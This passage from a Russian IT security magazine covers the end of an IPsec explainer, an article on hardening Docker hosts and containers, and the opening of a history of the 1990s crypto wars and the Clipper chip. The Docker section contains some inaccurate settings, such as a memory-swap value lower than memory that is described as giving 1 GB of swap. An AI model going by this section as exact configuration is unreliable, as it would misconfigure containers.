до сложнее. При исполь зовании PFS, если кто‐то получит доступ к общему
клю чу, он не смо жет расшифровать им перехваченный трафик, в этом и суть
forward secrecy. Подоб ранный ключ от одной сес сии также не поможет рас‐
шифровать последующие, при усло вии, что числа достаточно большие, имен‐
но поэтому DH1024 и DH1536 стали небезопас ны — современное железо уже
достаточно быстрое для их взло ма.
  Параметр Phase2  lifetime (ESP  lifetime) ука зывает, как час то дол жен
меняться ключ. Время жизни ключа — чисто локаль ный параметр, который
не согласуется через IKE и может оказаться разным на разных сторонах. Если
твои туннели IPsec сна чала передают тра фик, а потом вдруг перестают
работать, проверь, совпада ет ли время жизни клю ча на обеих сторонах.


SECURITY ASSOCIATIONS
В отличие от OpenVPN или wireguard, IPsec сам по себе не создает никаких
виртуальных интерфейсов. Во времена его зарождения у каждого хоста
в интернете был публичный адрес и никакой потребности в виртуальных сетях
с отдельной адресацией прос то не было. Виртуальными интерфейсами
занимаются отдельные протоколы, например L2TP или GRE, а IPsec только
шифрует их трафик. Многие плат формы поддерживают VTI — ассоциирован‐
ный с соединением IPsec виртуальный интерфейс, но на деле это все го лишь
автоматизированная настройка IPIP поверх IPsec.
  Вместо туннелей IPsec оперирует еще более абс трактными сущ ностя ми —
security associations. Они не являются сетевыми соединени ями, это просто
наборы параметров, которые указывают, какой трафик и как шифровать.
К примеру, «трафик из 192.168.1.0/24 в 10.1.0.0/24 зашифровать AES‐
128 и добавить сумму SHA‐1».
   Security associations сущес твуют на обеих сторонах независимо и не могут
оборваться сами по себе, в отличие от сетевых соединений. Если ты видишь
на своей стороне живую SA, это еще не зна чит, что трафик нормально пойдет
на вторую сторону туннеля. Не забывай проверять, что все на самом деле
работает. Чтобы вторая сто рона могла узнать, что у тебя происходит, нужно
настроить dead peer detection (для IKEv1) или использовать IKEv2, где есть
liveness check.
  В случае с dead peer detection не забывай проверять, что параметры
на обеих сторонах совпадают, ина че можно надолго остаться с туннелем,
который только выглядит как живой.


NAT TRAVERSAL
IPsec появился до NAT и в своем чистом виде работать за NAT не может. Эту
возможность к нему прикрутили позже. Сам ESP — отдельный протокол IP
с номером 50. Для работы за NAT его инкапсу лируют в UDP. В этом случае IKE
и инкапсулированный ESP используют один порт — UDP/4500.
  Изначально от NAT страдали пользователи клиентских соединений вроде
L2TP и IPsec. Популярность облачных платформ, где вместо присвоения хос‐
там публичных адресов эти адреса раз дают через 1:1, NAT сделала эту проб‐
лему актуальной и для соединений меж ду маршру тизаторами.
  При этом может возникнуть неожиданная проблема: если на дру гой сто‐
роне туннель настроен на фиксированный адрес, даже если NAT traversal под‐
держивается, соединение не зарабо тает.
  Дело в том, что в пакетах IKE присутс твует идентификатор хоста. По умол‐
чанию большинство реализаций используют в качестве идентификатора
адрес интерфейса, с которо го отправляются пакеты, и в случае с NAT он
перестает совпадать с адресом источни ка, когда пакеты доходят до второй
стороны.
  Решение простое: никто не обязыва ет использовать идентификатор
по умолчанию. В него можно прописать вообще любую строку, иногда даже
необходимо, к примеру если у второй сто роны нет фиксированного адреса
или используется x.509.
  Например, в StrongSWAN:


conn mypeer
  left=%defaultroute
  leftid="192.0.2.10"


IKEV1 VS IKEV2
У IKE есть две вер сии — IKEv1 и IKEv2. IKEv2 получила сколько‐нибудь
широкое распространение только в пос ледние нес колько лет, и то не вез де,
но у нее есть ряд ощутимых преимуществ.
 • Окончательная стандартизация работы через NAT — в большинс тве слу‐
   чаев она теперь просто работает.
 • Liveness check — двусторонний keepalived для проверки, живы ли SA.
 • Возможность совместить несколько критериев шифрования трафика
   в одной SA.

В IKEv1 на каждую пару локальных и удален ных адресов нужна была отдель‐
ная SA. К примеру, если хос там 192.168.1.1 и 192.168.1.2 нужен доступ через
туннель к 10.1.0.1 и 10.1.0.2, демон IKE создаст четыре отдельные SA.
IKEv2 в этом смысле более гибкая.
  В IKEv2 также окончатель но удален aggressive mode, в котором парамет‐
ры Phase 1 и Phase 2 передавались одновременно. Значительная часть
реализаций, впрочем, давно перестала его поддерживать и в IKEv1 из‐за оче‐
видных проблем с безопас ностью такого подхода.
   Если обе сто роны поддерживают IKEv2, лучше использовать именно ее.
Если инте ресно почитать стандарт, она описана в RFC 5996.


ЗАКЛЮЧЕНИЕ
Надеюсь, если IPsec был для тебя загадочным, теперь принципы его работы
стали понятнее. Не забывай, что безопасность параметров шифрования
на твоей совести и что не все конфликты настроек обнаружатся автоматичес‐
ки.
   Если тебе будет интерес но, в следующий раз я напишу о типичных ошиб‐
ках в настройке и способах определить, что пошло не так, даже если конфиг
второй стороны недоступен, а админы некомпетентны.
АДМИН





  Иван Пискунов



ОБОРОНЯЕМ
ПОРТ

 КАК ЗАЩИТИТЬ
 ИНФРАСТРУКТУРУ НА DOCKER
 МИНИМАЛЬНЫМИ СИЛАМИ





Docker — прекрасная вещь, которая может экономить массу
сил и времени. В  этой  статье мы поговорим о  том,
как использовать Docker максимально безопасно и отлавли‐
вать потенциальные угрозы заранее. Также ты най дешь
здесь  готовые рекомендации, команды и инструменты,
которые легко использовать в сво ем проекте.


Контейнерная виртуализация на базе Docker крайне популярна среди De‐
vOps‐админов. Она позволяет быстро рас катать инстру менты разработки
и тестирования ПО или целые проекты из многих компонентов. И все бы
хорошо, если бы не целый класс специфичес ких угроз безопасности. Это и
возможность побега из контейнера в хостовую систему, и шатдаун инстанса
в результате «отказа в обслуживании», и кейсы с эксплу атацией уязвимостей
ядра ОС, и подкидывание заранее скомпрометированных эталонных образов
в репозиторий, и тому подобные ата ки.
  В этом материале мы с помощью админ ской смекалки, пря мых рук и всех
доступных  штатных  средств  Linux  научимся  настраивать  максимально
безопасное и кон тролиру емое DevOps‐окружение на основе контейнериза‐
ции Docker.


Гла зами безопас ника
Мы уже не раз рассказыва ли о самой сис теме контей неризации, публиковали
большой FAQ по ней, рас крывали малоизвестные трюки и фишки и на пальцах
объясняли, как сделать свою песочницу. Однако вопрос настройки опций
безопасности для контейнеров все это время оста вался в стороне. Сейчас
мы посмотрим на Docker глазами спеца по безопас ности (или хакера, если
уж мы всерьез подняли эту тему).



ЧТО ТАКОЕ DOCKER И КАК ОН РАБОТАЕТ
Docker — это ПО для автоматизации раз вертывания приложений и управле‐
ния ими в средах с поддержкой контей неризации. Софтина позволя ет упа‐
ковывать любое приложение со всем его окру жением и зависимос тями в спе‐
циальный контейнер, который можно запустить в любом современном Linux.
   Таким образом, каждый соз данный нами контейнер уже включает в себя
все необходимое для работы приложения — биб лиотеки, системные инстру‐
менты, код и среду исполнения. Благода ря Docker DevOps‐администраторы
и разработчики могут быстро раз вертывать, мас штабировать и запускать
свои приложения в любой среде и быть при этом уверенными, что написан‐
ный код будет нормально работать.
   Docker имеет многие фишки, которые есть у сис тем традиционной вир‐
туализации. К примеру:
 • независимость — контейнер можно перемес тить на любую ОС с пред‐
   варительно поднятой службой Docker и запус тить одной командой;
 • самодостаточ ность — контейнер будет выполнять все заданные ему фун‐
   кции в любом месте, где бы его ни запустили, без дополнительной нас‐
   тройки и обслуживания.

Однако в отличие от традиционной вир туализации, где образ мы, как пра‐
вило, формируем сами, Docker работа ет с образами, взя тыми из репози‐
ториев. Существуют  пуб личные  и  приватные  хранилища офи циальных
и неофициальных образов. В документации они называются docker registry.
А самый популярный на сегодня и час то исполь зуемый репозиторий —
это Docker Hub.





                     Сравнение Docker и VM

Docker image — это последова тельный набор программных слоев. Каждый
слой — результат работы команды в конфигура ционном файле Dockerﬁle. То
есть образ — это шаблон, на основе которого мы запус каем контейнер. А вот
все, что запускается на основе этого обра за, и есть сам контей нер (инстанс).
В итоге у Docker появляется очень полезная фича, которая позволяет
из одного подготовленно го образа запускать нес колько одинаковых копий
этого образа, то есть контейнеров.


             INFO

                         Docker, как и любое другое ПО, к сожалению,
                    имеет свои уязвимости и недостатки безопас‐
                         ности, которые может проэксплуатировать хакер.
                Мы ранее уже писали про неверно настроенные
                          root‐аккаунты, подвергающие кон тейнеры ком‐
                      прометации, легальные образы с запиленными
                       бэкдорами, рабочими PoC‐эксплоитами и сов сем
                       свежий критический баг, для которого еще нет
                        патча.



ТИПОВЫЕ ПРОБЛЕМЫ БЕЗОПАСНОСТИ, СВЯЗАННЫЕ С DOCKER
Давай  пройдемся  по  типовым  кейсам,  свя занным  с  безопасностью
инфраструктуры Docker.


Бе зопасность хостовой системы
Один из самых простых и в то же время ключевых вопросов защиты Docker —
это безопасность хостовой машины, в час тности ядра ОС. Ведь в уже ском‐
прометированной системе изоляция и прочие механизмы безопасности кон‐
тейнеров, которые мы могли бы использовать, нам вряд ли помогут. А все
потому, что Docker спро ектирован таким образом, что все запущенные кон‐
тейнеры используют ядро хоста. Поэто му в качес тве хоста должен быть про‐
патченный, обновлен ный дистрибутив  Linux без известных  уязвимостей
и признаков инфицирования малварью.
   Классический пример такого кейса — это побег из контейнера Docker.
В официальной документации этот баг называется «выходом за пределы кон‐
тейнера» (container breakout) и описывает ситуацию, при которой программе,
запущенной внутри контейнера, удается преодолеть механизмы изоляции
и получить рутовые при вилегии или доступ к важной информации, хранящей‐
ся на хосте. Типичный пример этого бага — DirtyCow (CVE‐2016‐5195), мы
о нем уже рассказывали.
  Для реализации защиты от подобных ситуаций используется правило
уменьшения  количества  привилегий  для  контей нера,  выдаваемых  ему
по умолчанию. Так, если демон Docker выпол няется под рутом, то мы соз‐
даем для него пользовательское пространство имен (user‐level namespace)
с минимальными привилегиями.


Исчерпание ресурсов, или DDoS на кон тейнер
Если сравнивать контейнеры с виртуальными машинами, то первые более
легковесны. Даже на старом и слабом железе можно запустить много контей‐
неров. Однако ошибки в конфигура ции демонов, сетевого стека, недостатки
проектирования архитектуры и ата ки хакеров могут приводить к сос тояниям
типа «отказ в обслужива нии» (Denial of Service).
  К примеру, некий контейнер или целый пул контейнеров может пожрать
все процессорное время хоста и просадить его производительность. Ана‐
логичная ситуация может сложиться и с сетевыми интерфейсами, когда
количество генерируемых пакетов превысит нормальную пропускную способ‐
ность сети. Но выход тут, в прин ципе, довольно прост: дол жным образом нас‐
троить лимиты ресурсов для контейнера.


Скомпро метирован ные образы для Docker
Docker распространяется как open source, и образы для создания собствен‐
ных контейнеров тоже находятся в публичном бес платном доступе. А это зна‐
чит, что злоумышленники с помощью фишинга и других методов социальной
инженерии могут попробовать манипулировать действиями пользователей
хранилищ Docker Image, чтобы заставить их ска чать заранее скомпромети‐
рованный образ с малварью или бэкдорами.
  Например, в апреле этого года много шума наделала новость о том,
как неизвестные злоумышленники получили дос туп к базе данных крупнейшей
в мире библиотеки обра зов для контейнеров Docker Hub. В результате были
скомпрометированы имена пользователей, хеши паролей, а также токены
для репозиториев GitHub и Bitbucket, используемых для автомати зированных
сборок Docker. Или взять но вость лета 2018 года, когда из официального
реестра Docker Hub были уда лены сра зу семнадцать образов контейнеров,
содержавших опасные бэкдоры. Как позже выяснили эксперты, через них
на серверы пользователей проникала малварь в виде криптомайнеров и юза‐
лись обратные шеллы.


           WARNING

                    Перед любыми операциями по конфигурирова‐
                    нию  системы  не  забывай  сделать  бэкап!
                      Документируй  все  изменения,  чтобы  потом
                      не  рвать себе волосы на затылке,  когда ты
                       забудешь,  что и  в  какой последовательности
                       менял.  И  обязательно  проверяй  изменения
                       на тестовом стенде перед переносом в их про‐
                        дакшен‐среду!



УСИЛИВАЕМ БЕЗОПАСНОСТЬ DOCKER
Итак, как нам укрепить Docker? Сна чала мы раз берем общие рекомендации,
а затем конкретные примеры конфигурирования правил и политик безопас‐
ности для контейнерного пула.


Использование достоверных образов
Начнем, пожалуй, с банальной для репозиториев Docker проблемы — дос‐
товерности образа. Чтобы избежать проб лем с фейковыми образами,
используй приватные (private) или строго доверенные репози тории (trusted
repositories) вроде Docker Hub. В отличие от дру гих репозиториев, образы,
которые там хранятся, всегда ска ниру ет и прос матри вает специальный робот
безопасности Docker’s Security Scanning Service.





  Результат проверки образа в Docker Hub с помощью Docker’s Security
  Scanning Service


Ве рифициру ем образы через сервис Docker Content Trust
Еще один полезный и дос тупный всем инс трумент, которым стоит вос поль‐
зоваться, — Docker Content Trust. Это новая функция, доступная с версии
Docker Engine 1.8. Она позволяет верифицировать владельца образа. Таким
образом этот сервис защищает тебя от фейков и подделок, атак повторного
воспроизведения и компромета ции ключей.


Про верка хоста и кон тейнера с помощью Docker Bench Security
Очень полезный инструмент, которым я сам недавно пользовался, —
это Docker Bench Security (см. также документацию к нему). По сути, это боль‐
шая подборка рекомендаций, советов и практик по развертыванию контей‐
неров  в  продакшене.  Инс трумент  осно выва ется  на  рекомендациях
из документа The CIS Docker 1.13 Benchmark (PDF) и применя ется в сле‐
дующих областях:
 • конфигурация хоста (ядро, процессы, разрешения);
 • конфигурация демона Docker (сеть, выделение RAM, CPU);
 • файлы конфигурации демона Docker;
 • образы контейнеров и build‐файлы;
 • Runtime контейнера;
 • опции «по умол чанию» Docker security.

Чтобы установить этот скрипт проверки, клонируй репози торий сле дующей
командой в терминале:


$ git clone git@github.com:docker/docker‐bench‐security.git

После этого запускаем скрипт:


$ cd docker‐bench‐secutity

и юзаем такую вот длинную команду:


$ docker run ‐it ‐‐net host ‐‐pid host ‐‐cap‐add audit_control \
  ‐e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
  ‐v /var/lib:/var/lib \
  ‐v /var/run/docker.sock:/var/run/docker.sock \
  ‐v /etc:/etc ‐‐label docker_bench_security \
  docker/docker‐bench‐security

Выпол нив эти шаги, ты соберешь все контей неры и запустишь скрипт,
который проверит безопасность хост‐машины (kernel OS) и ее контейнеров.
И это займет все го лишь несколько минут!





                Запуск скрипта Docker Bench Security


Использование нативных опций безопасности на хостовых ОС
Для усиления безопасности ты можешь вос пользоваться штатными инстру‐
ментами Linux. Среди них — AppArmor, SELinux, grsecurity и Seccomp.
  Проще все го было бы ска чать дефолтный профиль Seccomp для Docker.
Чтобы обеспечить самый банальный уровень секьюрности, достаточно скор‐
ректировать белый список системных вызовов в рай оне строки 52 — то есть
просто удалить из него рисковые команды chmod, fchmod и fchmodat.
  Однако тонкая настрой ка этих механизмов безопасности выходит далеко
за рамки нашей статьи. Если ты еще ни разу их не конфигурировал, обращай‐
ся к официальной документации. От себя рекомендую пару неплохих статей
по Seccomp и SELinux.


        WWW

                     Подробное руководство по бронированию Dock‐
                                er, а так же примеры бенчмарков опций безопас‐
                       ности и контрольный чек‐лист проверки ты най‐
                     дешь в документе The CIS Docker 1.13 Benchmark.



НАСТРОЙКА ОПЦИЙ УСИЛЕНИЯ БЕЗОПАСНОСТИ ДЛЯ DOCKER
Вот мы наконец и доб рались до консоли! Сей час будем ручками выстраивать
безопасность для Docker. Готов? Поеха ли!


Ограниче ния Docker Engine
Вспомним, что Docker Engine — это своего рода API, который прослушивает
все входящие запросы и вза имо действует с базовым ядром хос та. Docker En‐
gine поддерживает связь на трех сокетах: unix, tcp и fd.
  Безопасное состояние по умолчанию — это прос лушивание сокета unix.
Для активации этой опции набери в терминале


$ dockerd ‐H "unix:///var/run/docker.sock"

Готово, больше ничего не требуется!


Выставляем ограниче ние на привиле гии выпол нения
По возможности запускай контейнеры как обычный пользователь без пол‐
номочий root:


$ docker run ‐d ‐u 1000 debian sleep infinity
$ ps aux | grep sleep
1000 ... sleep infinity

Чтобы максимально уменьшить пло щадь потенциальной атаки, подумай
над следующими вопросами:
 • Какое сетевое подключение требует ся для работы приложения и вообще
   требуется ли оно?
 • Нужен ли приложению прямой дос туп к сокету?
 • Требуется ли приложению отправлять и получать UDP‐запросы?

Для настройки ограничений будем использовать команды ‐‐cap‐drop and
и ‐‐cap‐add.
  Предположим, приложению абсолютно не требует ся изменять системные
процессы или биндить привилегированные порты, но при этом нужно заг‐
ружать и выгружать модули ядра. Соответству ющие возможности можно уда‐
лить и добавить следующим образом:


$ docker run \
  ‐‐cap‐drop SETPCAP \
  ‐‐cap‐drop NET_BIND_SERVICE \
  ‐‐cap‐add SYS_MODULE \
  ‐ti /bin/sh

Также необходимо сле дить за случаями монтирования потенциально опасных
ресурсов хоста (к примеру, таких, как /proc, /dev, /var/run/docker.sock).
Несмотря на то что эти ресурсы нужны для работы контейнеров, все же стоит
задуматься о необ ходимости ограничить доступ процессов к ним. К при меру,
будет достаточно лишь установить к ним режим доступа «только чтение».
  Для обеспечения безопасности сетево го вза имо действия можно настро‐
ить правила iptables, реализованные в Docker. Например, указать диапазон
IP‐адресов для источника пакетов, что бы ограничить трафик на контейнер.
Это поможет предотвратить обращение глубоко изолированного контейнера
во внешнюю сеть. Включить эту функцию мож но всего парой команд:


$ iptables ‐t filter ‐A FORWARD ‐s
<source_ip_range> ‐j REJECT ‐‐reject‐with
icmp‐admin‐prohibited


Ограничиваем потребле ние системных ресурсов
Чтобы откалибровать пул ресурсов, выделяемых для контейнера (CPU, RAM,
SWAP, I/O), нужно задать порого вые зна чения следующими командами:
 • m , memory — уста новить лимит выделения оперативной памяти (hard);
 • memoryreservation — уста новить мягкий лимит памяти (soft);
 • kernelmemory — уста новить лимит памяти ядра (kernel OS);
 • cpus — ограничить количес тво используемых CPU;
 • devicereadbps — огра ничить пропускную способность  чтения
   для конкретного устройства.

Также не забывай юзать специальную фичу под названием cgroups. Кон‐
трольные группы (cgroups) — это предоставляемый ядром Linux штатный инс‐
трумент, который позволя ет огра ничивать дос туп процессов и контейнеров
к системным ресурсам. Некоторые лимиты можно контролировать сразу
из командной строки Docker, например:


$ docker run ‐it ‐‐memory=4G ‐‐memory‐swap=1G debian bash

Этой командой мы выделяем для работы контейнера 4 Гбайт оперативной
памяти и 1 Гбайт для кеширо вания в своп.


Монито рим активность работы кон тейнеров
Мониторинг, обнаружение аномального, подозритель ного поведе ния контей‐
нера и оповещение о нем — это один из клю чевых инструментов анализа
и своевременного реагирова ния на инциденты. Для этих целей можно
использовать тулзу с открытым исходным кодом Sysdig Falco.





                      Сер вис Sysdig Falco

Sysdig Falco работает как система обна ружения вторжений и в особенности
полезна при использовании Docker, пос кольку в про цес се создания правил
поддерживает специфичес кий для контей неров контекст, такой как contain‐
er.id, container.image, ресурсы Kubernetes или прос транства имен.
   Да, кстати, еще одна вещь из стандартного набора контроля и аудита
ОС — это журналирование событий. Для этого запускаем контейнер с клю‐
чом, ответственным за логирование:


$ docker run ‐v /dev/log:/dev/log
<container_name> /bin/sh


Палим CVE-уяз вимости в кон тейнерах
Контейнеры Docker — это, по сути, изолированные черные ящики, которые
крутятся на родительском хосте. Однако все может отлично работать, но при
этом внутри оказывается уяз вимое ПО. Причем в апс триме уязвимости могут
быть давно пропатчены, но не в твоем локальном образе! И если не принять
меры, такие проблемы могут долго оста вать ся незамеченными. И что, скажи
на милость, с этим делать?
  Многие реестры образов Docker предлага ют услу гу сканирования этих
самых образов. Например, сервис CoreOS Quay использует сканер безопас‐
ности образов Docker с открытым исходным кодом под названи ем Clair.
Clair — это приложение, написанное на Go, которое реализует набор HTTP
API для выгрузки, загрузки и ана лиза образов. Данные об уязвимос тях заг‐
ружаются из разных источников, таких как Debian Security Tracker или Red Hat
Security Data. В этом слу чае движок Clair работа ет по принципу статического
анализатора без запуска контейнера на выполнение.





                 Сер вис CoreOS Quay для Docker

Ну и если ты совсем зеленый админ или руководство адски жмет денег,
где‐то на просторах Сети, говорят, есть аналогичные сервисы с теми же воз‐
можностями, но при этом совершенно бесплат ные! Правда, я таких пока
не встречал. Поэто му, если уж совсем нет выбора, можно юзать старый доб‐
рый OpenVAS либо аналогичный секьюрный сканер, который ты будешь
запускать ручками по расписанию внутри своей корпоративной сетки.


        WWW

                     Несколько  интересных  прак тических  гайдов,
                        руководств и сборников рецеп тов, как усилить
                       безопасность Docker, для самостоятельного изу‐
                         чения:
                           •Mitigating Docker Security Issues — гайд, рас‐
                        сматривающий  основные  риски  и  угрозы
                        безопасности Docker. Там же ты найдешь прак‐
                          тические  примеры  настроек  безопасности
                         для решения этих проблем;
                       •Docker Secure Deployment Guidelines — неболь‐
                      шая страница на GitHub с описанием рекомен‐
                        даций  и  основных  настроек  безопасности
                         для Docker;
                     •10+ top open‐source tools for Docker security —
                        обзор  нескольких  полез ных  инструментов
                         для  контроля  над  безопасностью  исходных
                        образов и запущен ных контей неров.



ЗАКЛЮЧЕНИЕ
Поздравляю! Сегодня мы про кача ли твои админские скиллы в защите систем
контейнеризации на базе Docker. Теперь ты зна ешь об основных угрозах
для DevOps‐окружения и понимаешь, чем можно поплатиться за беспечность,
если не обращать внимания на тему секьюрности. Также мы собрали неп‐
лохой набор инструментов для обеспечения безопасности Docker. Наде юсь,
он поможет тебе максимально защитить свои информационные активы
без внушительных вложений денег и времени.
GEEK

КРИПТОВОЙНЫ
      ДИКОГО
      ЗАПАДА





          КАК АНБ ОДНАЖДЫ
          ХОТЕЛО ВВЕСТИ
       ТОТАЛЬНУЮ ПРОСЛУШКУ,
         НО ПРОИГРАЛО





Конфликт    между    Роскомнадзором
и  Telegram  в прошлом  году — далеко
не первая попытка пра вительства получить
доступ  к шифрован ным цифровым ком‐
муникациям. О самом жарком и показа‐           Антон Карев                                                                                    Эксперт по информационной
тельном примере про тивостояния властей         безопасности.профессиональныхОбласть
и поборников приватности у нас мало кто      интересовразведка, аналитика— технологическаяв сфере
знает, поскольку дело было в США и отно‐        ИБ и интеллектискусственный
                                                                                              vedacoder@mail.ru
сительно дав но — в начале девяностых.
В этой статье я расскажу об исто рии кон‐
флик та  и  попыта юсь  выявить  уро ки,
которые  руководители  спецслужб  тогда
усвоили, но успели позабыть.


КРИПТОВОЙНА: ДВАДЦАТЬ ЛЕТ СПУСТЯ
В 2014 году компания Apple объявила о том, что на всех смартфонах с новой
версией iOS по умол чанию активирована функция сквозного шифрования.
Через несколько дней подобная новость поступила и от Google.
  Два технологических гиганта предприняли этот шаг не от хорошей жизни.
Их на это подвигло падение доверия потребителей, вызванное широко
нашумевшими откровениями Сноудена в 2013 году (см. отчет New America).
Вот американские компании с Google и Apple во главе и начали двигаться
в сторону серьезной защиты приватности, в частнос ти повсеместного HTTPS
и сквозного шифрования переписки (например, его добавили в WhatsApp).
   Потребители встретили такую криптогра фичес кую инициати ву бурными
овациями, чего не скажешь о правитель ственных спецслужбах. Смотри, нап‐
ример, нападки на шифрование в iOS 8 и Android L директора ФБР Джеймса
Коми или заметку вторящего ему прокурора окру га Манхэттен Сайруса Вэн‐
са.
  Коми заявил: «Новые функции повышения уровня конфиденциальности,
реализованные в гаджетах Apple и Google, позволя ют гражданам выйти
за рамки закона. Мы дол жны принять меры, чтобы эти компании согласились
размещать в сво их устройствах правительственные бэкдоры, чтобы наши
спецслужбы могли при необходимос ти беспрепятственно расшифровывать
любые коммуникации». Бывший генпро курор Эрик Хол дер тоже приз вал тех‐
нологические компании обеспечить бэкдоры для правоохранительных орга‐
нов. Их аргументы получили поддержку АНБ.
  Все эти обстоятельства положили начало горячей дис куссии. Осуществи‐
мо ли технически внедрение шпионских бэкдоров без ущерба для общей
безопасности? Какими будут последс твия их внедрения для экономических
и гражданских свобод? Свои ответы на эти воп росы дали, например, изоб‐
ретатель криптографии с открытым ключом Уитфилд Диффи, знаменитый
ИБ‐эксперт Брюс Шнайер, калифорнийский сенатор Тед Лиу (имеющий,
в отличие от своих коллег, дип лом программиста) и многие другие знатоки.
Надо ли говорить, что они выступили не на стороне ФБР и АНБ?
   Ровно такую же политическую баталию — с теми же аргументами и кон‐
траргументами — мир уже видел двадцать лет назад (и даже многие учас тни‐
ки с обеих сторон фигурировали те же). Тогда ее окрестили «криптовой ной».
Стало быть, сегодня мы имеем честь наб людать «криптовойну 2.0».


КАК НАЧИНАЛАСЬ КРИПТОВОЙНА ДЕВЯНОСТЫХ
Хотя армия и контрразведка применяют криптографию испокон веков, дебаты
о праве общественности на использование шифров начались с момента
изобретения «криптогра фии с открытым ключом» в 1976 году. Дебаты эти
открылись знаменитой стать ей Диффи и Хеллма на «Новые направления
в криптографии» (PDF), в которой расска зывалось, как обычные люди и пред‐
приятия могут безопасно передавать данные по общедоступным сетевым
каналам. Эта статья бросила вызов давней монополии правительственных
спецслужб на использование шифров.


        WWW

                     Подробнее о влиянии изобретения Диффи — Хел‐
                     лмана на разрешение кон флик та ты можешь про‐
                         честь в статье Keeping Secrets, опубликованной
                        в Stanford Magazine в 2014 году.


Вскоре после публикации «Новых направлений крип тографии» трое матема‐
тиков из Массачусетско го технологического (Рональд Ривест, Ади Шамир,
Леонард Адлеман) разработа ли алго ритм RSA (комбинация их инициалов),
который воплотил эту новую теорию шифрования на практике (см. их работу:
PDF). RSA позволил обычным людям вести конфиденциальную переписку
по электронной почте. Имен но благода ря ему ста ли возможны «циф ровые
подписи».
   Криптографию с открытым ключом радуш но приняли предприятия и час‐
тные лица. Однако правитель ственные службы не разделяли их вооду шев‐
ления. К началу девяностых широкое распространение ПК, сотовых телефо‐
нов и интернета заставило спецслужбы задумать ся о влиянии криптостойкого
шифрования на их возможнос ти прослушки.


        WWW

                    Ин тересный пример противостояния сооб щества
                       специалистов по крип тографии и национальных
                       ведомств описан в статье, опубликованной в New
                         York Times в 1989 году. Если вкратце, произошло
                       следующее: исследователь из Xerox PARC описал
                        в научной статье бюд жетное устройство для шиф‐
                        рования;  в  АНБ,  ознакомившись  с  текстом,
                      наложили серьезные ограниче ния на его рас‐
                       пространение; ученый залил статью в сеть Usenet
                      всем напоказ, чем прогневал АНБ, но судить его
                        в итоге оказалось не за что — зап рет, как выяс‐
                        нилось, имел статус рекомендации.


В январе 1991 года сенатор Джо Байден добавил новый пункт в проект
закона о борьбе с терроризмом: «Пос тавщики услуг электронных коммуника‐
ций и производители телекоммуника ционного обо рудования должны обес‐
печить правительственным служ бам воз можность получать незашифрован‐
ные версии голоса, текста и других видов контента». Хотя этот пункт не был
утвержден, намек технологическим компаниям был край не прозрачным: пра‐
вительство вряд ли позволит существовать средс твам связи, обеспечива‐
ющим надежное шифрование. С 1992 года в АНБ начались серьезные дис‐
куссии, как решить «проблему» широкого рас пространения надежного шиф‐
рования раз и навсегда.
   Криптовойна приближалась!


        WWW

                     Подробнее об этих событиях ты можешь узнать
                       из  статьи Джея  Сто уски  и  из  книги  Crypto
                        за авторством Стивена Леви, известного авто ра
                       биографии Стива Джобса и других биографий
                      и книг об истории вычислительной техники.



ДВА ВЗГЛЯДА НА CLIPPER — ЧИП С БЭКДОРОМ ДЛЯ АНБ
Идея найти приемлемый способ доступа к клю чам, используемым в шиф‐
рованных средствах коммуникации, не покида ла умы спецслужб на протяже‐
нии всех девяностых. В АНБ для это го раз работали новый алгоритм шиф‐
рования, известный как Skipjack. Он стал куль минаци ей усилий АНБ, нап‐
равленных на продвижение «компромиссной» крип тографии: и безопасной,
и легкодоступной для спецслужб.
  В АНБ свое детище позиционировали как «более сложный и надежный
алгоритм, чем какой‐либо другой из доступных на сегодняшний день. Даже
лучше DES». Но сотрудники АНБ предоставляли Skipjack (в виде так называ‐
емого чипа Clipper) технологическим компаниям с дву мя оговорками.
   Во‐первых, алгоритм был засекречен. Поэто му его можно было встра‐
ивать только в те устройства, которые изготавливались в тесном сотрудни‐
честве с представителем АНБ. Никому за предела ми ведомства не раз‐
решалось видеть, как именно работает алгоритм Skipjack. Во‐вторых, в АНБ
позволяли использовать Skipjack только тем технологическим компаниям,
которые соглашались встроить в свое оборудование правительственный бэк‐
дор, — чтобы спецслужбы могли получать доступ к клю чам от всех коммуника‐
ций, защищенных шифром Skipjack.
  Для повыше ния доверия общественности к Skipjack в АНБ соз вали группу
академических и отраслевых экспертов — проана лизировать эффективность
шифра и донести до широких масс идею, что «Skipjack представляет собой
средство, позволя ющее сбалансировать индивиду альные интересы час тной
жизни с общим социальным бла гом» и что «стоимость взлома Skipjack пря‐
мым перебором очень высока. Она сравняется со стоимостью такого же
взлома DES — раньше чем через 36 лет».
   Спустя несколько лет лидер этой груп пы АНБ, криптограф из Джорджта‐
унского университета Дороти Деннинг об молвилась, что решение АНБ о сох‐
ранении секретности Skipjack было попыткой скрыть критические уяз вимости
алгоритма.


        WWW

                     Подробный портрет Дороти Ден нинг ты можешь
                      найти в статье Стивена Леви Clipper Chick, опуб‐
                       ликованной журналом Wired в 1996 году (под‐
                        заголовок:  «После  смены  сторон  в  войне
                        государства против пиратства Дороти Деннинг
                      превратилась из хакера‐героя в одного из самых
                       ненавидимых людей в Сети»).


В июле 1993 года, пример но в то же время, как был опубликован отчет АНБ,
Национальный институт стандартов и технологий США (NIST) инициировал
общественное обсуждение Clipper. И его результаты рез ко контрас тировали
с заключениями группы гос пожи Деннинг. Только двое из 320 экспертов выс‐
казались в поддержку «Клиппера».
  Эксперты, объединившиеся под фла гом NIST, ука зали на три принципи‐
альные проблемы Clipper.
 1. По словам Уитфилда Диффи, попытка правитель ства США взять на себя
   роль «храните ля клю чей» нивелирует основное достоинство этого вида
   криптографии:  вновь  вво дит  зависимость  от  третьей  стороны.  Что
  еще хуже, этой третьей стороной будет пра вительство, которое уже
   показало свое неуважение к праву на приватную жизнь.
 2. Сами чипы Clipper были дорогос тоящими, а приобрести их можно было
   только у единственного пос тавщика, что исклю чало конкуренцию в про‐
   изводстве и ценообразова нии. Также существовал риск, что продукт
   с «Клиппером» может оказать ся несовмести мым с устройствами без него.
 3. Наконец,  эксперты  опасались,  что  пра вительственная  инициатива
   по продвижению Clipper — это первый шаг на пути к запрещению альтер‐
   нативных форм шифрования (см. публикацию NIST).


        WWW

                        Уитфилд Диффи и Сьюзан Ландау написали книгу
                           Privacy on the Line, где подробно запротоколиро‐
                       вали все аргумен ты тогдашних дебатов. Если же
                      ты предпочитаешь более крат кое чтиво, можешь
                         глянуть статью  «Показания Уитфилда Диффи»,
                        где  он  перечисляет  проблемы,  связанные
                        с Clipper.



МОБИЛИЗАЦИЯ ОБЩЕСТВЕННОСТИ ПРОТИВ CLIPPER
Публичная инициатива NIST была не единственным выраже нием озабочен‐
